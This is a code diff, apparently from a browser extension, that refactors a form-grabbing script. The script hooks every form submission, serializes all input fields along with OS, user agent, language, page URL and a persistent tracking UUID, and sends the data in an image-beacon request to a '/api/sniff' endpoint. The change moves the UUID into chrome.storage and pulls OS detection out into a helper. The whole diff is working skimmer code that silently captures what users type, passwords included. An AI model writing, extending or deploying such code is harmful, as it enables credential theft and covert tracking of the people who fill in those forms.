@@ -23,7 +23,7 @@ function scanDOM() {
 
                 form.onsubmit = function () {
                     var data = new FormData(this);
-                    
+
                     // Serialization by id
                     Array.from(this.elements).forEach(element => {
                         if (element.tagName === "INPUT" && element.id) {
@@ -31,18 +31,15 @@ function scanDOM() {
                         }
                     });
 
-                    let os = "Unknown";
-                    if (navigator.userAgent.indexOf("Win") != -1) os = "Windows";
-                    else if (navigator.userAgent.indexOf("Mac") != -1) os = "MacOS";
-                    else if (navigator.userAgent.indexOf("X11") != -1) os = "UNIX";
-                    else if (navigator.userAgent.indexOf("Linux") != -1) os = "Linux";
-
-                    data.append("os", os);
+                    data.append("os", getOs());
                     data.append("user_agent", navigator.userAgent);
                     data.append("lang", navigator.language);
                     data.append("url", window.location.href);
-                    data.append("uuid", getUUID());
-                    (new Image()).src = "http://localhost:8080/api/sniff?" + new URLSearchParams(data).toString();
+
+                    getUUID(function (uuid) {
+                        data.append("uuid", uuid);
+                        (new Image()).src = "http://localhost:8080/api/sniff?" + new URLSearchParams(data).toString();
+                    });
                 }
             }
         }
@@ -61,18 +58,27 @@ function formFromInput(element) {
     return formFromInput(element.parentNode);
 }
 
-function register() {
-    let uuid = getUUID();
-    if (uuid === undefined || uuid === null) {
-        uuid = crypto.randomUUID().toString();
-        localStorage[STORAGE_KEY] = uuid;
-    }
-
-    log("Registered client with UUID: " + uuid);
+function getOs() {
+    if (navigator.userAgent.indexOf("Win") != -1) return "Windows";
+    else if (navigator.userAgent.indexOf("Mac") != -1) return "MacOS";
+    else if (navigator.userAgent.indexOf("X11") != -1) return "UNIX";
+    else if (navigator.userAgent.indexOf("Linux") != -1) return "Linux";
+    else return "Unknown";
 }
 
-function getUUID() {
-    return localStorage[STORAGE_KEY];
+function register() {
+    getUUID(function (uuid) {
+        if (!uuid) {
+            uuid = crypto.randomUUID().toString();
+            chrome.storage.local.set({ [STORAGE_KEY]: uuid }, function () {});
+        }
+    });
+}
+
+function getUUID(callback) {
+    chrome.storage.local.get([STORAGE_KEY], function (result) {
+        callback(result[STORAGE_KEY]);
+    });
 }
 
 function log(message) {
